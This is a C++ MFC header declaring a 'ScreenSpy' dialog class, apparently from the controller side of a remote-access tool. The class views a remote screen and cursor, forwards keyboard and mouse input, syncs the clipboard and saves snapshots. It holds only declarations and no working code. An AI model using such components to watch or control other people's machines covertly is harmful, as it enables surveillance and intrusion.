﻿#pragma once
#include"include/IOCPServer.h"
#include"../common/CursorInfo.h"

// CScreenSpyDlg 对话框

class CScreenSpyDlg : public CDialog
{
	DECLARE_DYNAMIC(CScreenSpyDlg)

public:
	CScreenSpyDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // 标准构造函数
	virtual ~CScreenSpyDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_SCREENSPY };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()
private:
	int	m_nBitCount;
	bool m_bIsFirst;
	bool m_bIsTraceCursor;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;
	HICON m_hIcon;
	MINMAXINFO m_MMI;
	HDC m_hDC, m_hMemDC, m_hPaintDC;
	HBITMAP	m_hFullBitmap;
	LPVOID m_lpScreenDIB;
	LPBITMAPINFO m_lpbmi, m_lpbmi_rect;
	UINT m_nCount;
	UINT m_HScrollPos, m_VScrollPos;
	HCURSOR	m_hRemoteCursor;
	DWORD	m_dwCursor_xHotspot, m_dwCursor_yHotspot;
	POINT	m_RemoteCursorPos;
	BYTE	m_bCursorIndex;
	CCursorInfo	m_CursorInfo;
	bool m_bIsCtrl;
public:
	afx_msg void OnClose();
	virtual BOOL OnInitDialog();
private:
	void InitMMI();
	void SendNext();
public:
	afx_msg void OnGetMinMaxInfo(MINMAXINFO* lpMMI);
	afx_msg void OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	afx_msg void OnPaint();
private:
	void DrawTipString(CString str);
public:
	void OnReceiveComplete();
private:
	void DrawFirstScreen();
public:
	void DrawNextScreenDiff();
	void DrawNextScreenRect();
	void ResetScreen();
private:
	void UpdateLocalClipboard(char *buf, int len);
public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	void SendCommand(MSG* pMsg);
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	bool SaveSnapshot();
private:
	void SendLocalClipboard();
	void SendResetAlgorithm(UINT nAlgorithm);
	void SendResetScreen(int nBitCount);
};
